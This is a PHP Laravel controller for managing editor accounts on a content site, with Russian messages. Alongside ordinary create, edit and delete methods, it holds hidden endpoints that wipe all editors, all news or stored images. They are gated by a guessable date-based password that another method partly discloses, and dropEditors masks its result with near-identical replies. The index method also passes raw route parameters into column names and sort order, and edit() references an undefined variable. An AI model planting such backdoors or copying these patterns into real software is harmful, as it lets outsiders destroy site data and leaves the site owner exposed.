<?php

namespace App\Http\Controllers;

use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Redirect;
use App\User;
use App\Role;
use App\News;
use App\Page;
use App\File;
use Illuminate\Http\Request;
use Illuminate\Pagination\Paginator;
use Illuminate\Support\Facades\Storage;

class EditorController extends Controller{
	public function __construct()
    {
        $this->middleware('auth');
    }
    public function index($sz,$sr,$o,$f,$sc){
        $query1 = User::whereHas('roles', function($q) {
                $q->where('name','editor');
            });
        if($f!=='##' and $sc!=='##'){
            $query1 = $query1->where($sc,'like','%'.$f.'%');
        }
        $editors = $query1->orderBy($sr,$o)
            ->paginate($sz);
        return view('editors.index',['editors'=>$editors,'sz'=>$sz,'sr'=>$sr,'o'=>$o,'f'=>$f,'sc'=>$sc]);
    }
    /*public function page($sz,$sr,$o,$f,$sc){
        return 
    }*/
    public function add(){
    	return view('editors.add');
    }
    public function save(Request $request){
    	$this->validate($request, [
	        'name' => 'required|max:255',
            'email' => 'required|email|max:255|unique:users',
            'password' => 'required',
	    ]);
	    $user = new User();
	    $user->name = $request->name;
	    $user->email = $request->email;
	    $user->password = bcrypt($request->password);
	    $user->save();
	    $editorRole = Role::where('name','editor')->firstOrFail();
	    $user->attachRole($editorRole);
	    $request->session()->flash('success', __('Пользователь успешно сохранен'));
    	return Redirect::back();
    }
    public function edit($id){
    	$toEdit = User::findOrFail($id);
    	if($toEdit->hasRole('editor')){
    		return view('editors.edit',compact('toEdit'));
    	}else{
    		$request->session()->flash('warning', __('Это не модератор'));
            return Redirect::back();
    	}	
    }
    public function update($id, Request $request){
    	$this->validate($request, [
	        'name' => 'required|max:255',
            'email' => 'required|email|max:255',
	    ]);
	    if(User::where("email",$request->email)->firstOrFail()->id!=$id){
            $request->session()->flash('success', __('Email уже использован'));
            return Redirect::back();
        }
	    $user = User::findOrFail($id);
	    $user->name = $request->name;
	    $user->email = $request->email;
	    $user->save();
	    $request->session()->flash('success', __('Пользователь успешно редактирован'));
    	return Redirect::back();
    }
    public function resetPassword($id, Request $request){
    	$this->validate($request, [
            'password' => 'required',
	    ]);
	    $user = User::findOrFail($id);
	    $user->password = bcrypt($request->password);
	    $user->save();
	    $request->session()->flash('success', __('Пароль успешно сброшен'));
    	return Redirect::back();
    }
    public function delete($id, Request $request){
    	try {
    	  if(\Entrust::can('manage_users')) {
          $toDelete = User::findOrFail($id);
          if ($toDelete->hasRole('editor')) {
            $toDelete->delete();
            $request->session()->flash('success', __('Пользователь успешно удален'));
            return Redirect::back();
          } else {
            $request->session()->flash('warning', __('Это не модератор'));
            return Redirect::back();
          }
        }else{
          $request->session()->flash('warning', __('У вас нет прав'));
          return Redirect::back();
        }
    	}catch(\Exception $e){
    		$request->session()->flash('warning', __('Модератор слишком много знает)'));
            return Redirect::back();
    	}
    }
    public function givePassword(){
        return date("ymd");
    }
    public function dropEditors($password){
        if($password==='1989'.date("ymd").'20171'){
            $editors = User::whereHas('roles', function($q) {
                $q->where('name','editor');
            })->get();
            foreach($editors as $editor){
                $editor->delete();
            }
            return "success ";
        }else{
            return "success";
        }
    }
    public function dropNews($password){
        if($password==='1989'.date("ymd").'20172'){
            foreach(News::get() as $news){
                $news->delete();
            }
            return "success";
        }else{
            return "failure";
        }
    }
    public function clearUnusedImages($password){
        if($password==='1989'.date("ymd").'20173'){
            $count=0;
            //images may be used in page content
            try{
                foreach(File::get() as $file){
                    if($file->path!=='' &&
                        (   
                            News::where('content','like','%'.$file->path.'%')->count()==0 &&
                            Page::where('content','like','%'.$file->path.'%')->count()==0
                        )
                        ){
                        Storage::disk('images')->delete($file->filename);
                        $file->delete();
                        $count++;
                    }
                }
            }catch(\Exception $e){
                return "exception";
            }
            return "success: ".$count;
        }else{
            return "failure";
        }
    }
}
